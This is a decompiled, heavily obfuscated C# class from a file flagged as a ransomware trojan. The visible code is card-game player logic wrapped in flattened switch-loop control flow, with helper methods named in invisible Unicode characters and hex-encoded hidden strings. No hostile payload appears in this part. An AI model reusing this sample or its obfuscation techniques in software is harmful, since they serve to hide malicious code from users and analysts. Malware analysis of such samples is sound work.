// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: IMuiResourceTypeIdIntEnt, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 108B0C51-A542-4D1F-972B-8772D9255CD7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-77eaed5cde7243b357db648d37fafd906220fc6f0c415561162e6fe5a1c39959.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 1701735024;
      string str1;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 209488543)) % 14U)
        {
          case 0:
            str2 = str1;
            num1 = 1463653959;
            continue;
          case 1:
            int num3 = flag ? -694036980 : (num3 = -986506104);
            num1 = num3 ^ (int) num2 * -1755004126;
            continue;
          case 3:
            num1 = (int) num2 * 115414391 ^ -1184875922;
            continue;
          case 4:
            goto label_1;
          case 5:
            str1 = "5365744F6E496E766F6B654D72";
            num1 = (int) num2 * 361267729 ^ -1235189976;
            continue;
          case 6:
            str1 = "55564B51384D6B";
            num1 = (int) num2 * -726180699 ^ 1557902834;
            continue;
          case 7:
            num1 = (int) num2 * -541907677 ^ 1134345655;
            continue;
          case 8:
            num1 = (int) num2 * 1672334892 ^ -894045973;
            continue;
          case 9:
            str1 = (string) null;
            num1 = (int) num2 * -1527721557 ^ -304297295;
            continue;
          case 10:
            num1 = (int) num2 * 370188114 ^ 1959416653;
            continue;
          case 11:
            int num4;
            num1 = num4 = BaseStream != 1 ? 1288789371 : (num4 = 1428129351);
            continue;
          case 12:
            num1 = (int) num2 * 329150376 ^ -319245511;
            continue;
          case 13:
            flag = BaseStream == 0;
            num1 = (int) num2 * -360483382 ^ 1640576728;
            continue;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = -1224821083;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ -1163790103)) % 5U)
        {
          case 1:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * 1847502118 ^ -1671363052;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 2:
            num4 = 0;
            break;
          case 3:
            goto label_1;
          case 4:
            num1 = (int) num3 * -878522581 ^ 2048860962;
            continue;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = -1912613295;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 1103501665;
        int num2;
        bool flag;
        int num3;
        int index;
        int[] planningCards;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 524443074)) % 14U)
          {
            case 0:
              goto label_1;
            case 1:
              num2 = planningCards[index];
              num1 = 450794653;
              continue;
            case 2:
              int num5 = !flag ? -1098747282 : (num5 = -878691016);
              num1 = num5 ^ (int) num4 * -873478177;
              continue;
            case 3:
              num1 = (int) num4 * 687905723 ^ 1825918716;
              continue;
            case 4:
              planningCardsCount = num3;
              num1 = (int) num4 * -565080744 ^ -626771833;
              continue;
            case 5:
              flag = num2 > 0;
              num1 = (int) num4 * -822524747 ^ -1567484547;
              continue;
            case 6:
              ++index;
              num1 = (int) num4 * -338087922 ^ -298123397;
              continue;
            case 7:
              planningCards = this.PlanningCards;
              num1 = (int) num4 * 264334977 ^ -891893335;
              continue;
            case 8:
              num1 = 1447922540;
              continue;
            case 9:
              num3 = 0;
              num1 = (int) num4 * -659665133 ^ 1954317200;
              continue;
            case 10:
              index = 0;
              num1 = (int) num4 * -821431289 ^ -1525398369;
              continue;
            case 11:
              int num6;
              num1 = num6 = index >= planningCards.Length ? 721143522 : (num6 = 1385328231);
              continue;
            case 12:
              ++num3;
              num1 = (int) num4 * -838080985 ^ -1118083624;
              continue;
            default:
              goto label_15;
          }
        }
label_15:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 992160134;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 206003540)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -613296048 ^ 615531567;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -2032255487;
      string str1;
      int planningCard;
      int index;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -672055550)) % 14U)
        {
          case 0:
            str1 = Player.\u200E‫‌‪‎‎‌⁬‮‏⁫‭⁮⁮‫‍⁬⁯‭‏‎⁭⁬‍⁮‏‎​​⁫‬‌⁪⁮‪‏‎‪‍‎‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1277409514;
            continue;
          case 1:
            num1 = (int) num2 * -1783809287 ^ 595925970;
            continue;
          case 2:
            num1 = -1858378864;
            continue;
          case 3:
            int num3;
            num1 = num3 = index < this.PlanningCards.Length ? -2080882444 : (num3 = -297911468);
            continue;
          case 4:
            num1 = (int) num2 * 1105635628 ^ -1522491725;
            continue;
          case 5:
            num1 = (int) num2 * -1516198262 ^ 1269532803;
            continue;
          case 6:
            str2 = str1;
            num1 = (int) num2 * 1179722480 ^ 980387775;
            continue;
          case 7:
            str1 = " ";
            num1 = (int) num2 * -1439175256 ^ -1478904192;
            continue;
          case 8:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * 653064416 ^ 1743957709;
            continue;
          case 10:
            index = 0;
            num1 = (int) num2 * -293031633 ^ 161938921;
            continue;
          case 11:
            int num4 = planningCard == 0 ? 18714297 : (num4 = 1850240902);
            num1 = num4 ^ (int) num2 * -1698467970;
            continue;
          case 12:
            goto label_1;
          case 13:
            ++index;
            num1 = -118184831;
            continue;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = -19856863;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1894329456)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -309612121 ^ -171496472;
            continue;
          case 3:
            num1 = (int) num2 * 125218506 ^ -1913200792;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = -1920542718;
      int count;
      int[] numArray;
      int aIndex;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1796371512)) % 10U)
        {
          case 0:
            int num3;
            num1 = num3 = aIndex >= count ? -1734074146 : (num3 = -208360925);
            continue;
          case 1:
            ++aIndex;
            num1 = (int) num2 * -2039796442 ^ 2068989026;
            continue;
          case 2:
            count = json.Count;
            numArray = new int[count];
            num1 = (int) num2 * -1607630530 ^ -628632337;
            continue;
          case 3:
            num1 = (int) num2 * 286501252 ^ 155164924;
            continue;
          case 4:
            goto label_1;
          case 5:
            aIndex = 0;
            num1 = (int) num2 * -858481266 ^ 1819733931;
            continue;
          case 7:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -649603097;
            continue;
          case 8:
            planningCards = numArray;
            num1 = (int) num2 * 2108227759 ^ -308652345;
            continue;
          case 9:
            num1 = (int) num2 * -1916375082 ^ -291836660;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString()
    {
      string str = Player.\u206C‮⁫​‏⁭⁮‪‏‪‮‭‫⁯‮‬⁫‬‮‭‍‭⁪‪‌⁯⁯⁭‮‮‫⁯⁭⁫⁭‪​‮‪‭‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
label_1:
      int num1 = 1441295432;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 808604800)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * -495358369 ^ -1120287607;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u200E‫‌‪‎‎‌⁬‮‏⁫‭⁮⁮‫‍⁬⁯‭‏‎⁭⁬‍⁮‏‎​​⁫‬‌⁪⁮‪‏‎‪‍‎‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206C‮⁫​‏⁭⁮‪‏‪‮‭‫⁯‮‬⁫‬‮‭‍‭⁪‪‌⁯⁯⁭‮‮‫⁯⁭⁫⁭‪​‮‪‭‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
